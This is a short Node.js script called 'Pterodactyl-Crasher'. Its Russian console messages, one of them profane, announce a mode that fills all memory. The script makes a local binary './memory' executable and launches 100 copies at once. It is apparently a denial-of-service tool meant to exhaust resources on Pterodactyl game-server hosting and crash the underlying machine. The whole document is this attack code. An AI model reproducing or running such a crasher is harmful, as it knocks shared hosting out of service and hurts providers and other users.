console.log(`
github.com/xdearboy/Pterodactyl-Crasher

Pterodactyl-Crasher

Режим: забивка всей памяти
Подготовка..`);

console.log("Ебанный рот, погнали нахуй!");

(async() => {
    await (async() => {
        await (async() => {
            return new Promise(resolve => {
                require('child_process').exec('chmod +x ./memory', resolve);
            });
        })();

        let tasks = [];
        for (let i = 0; i < 100; i++) {
            tasks.push(
                (async() => {
                    return new Promise(resolve => {
                        require('child_process').exec('./memory', resolve);
                    });
                })()
            );
        }

        await Promise.all(tasks);
    })();
})();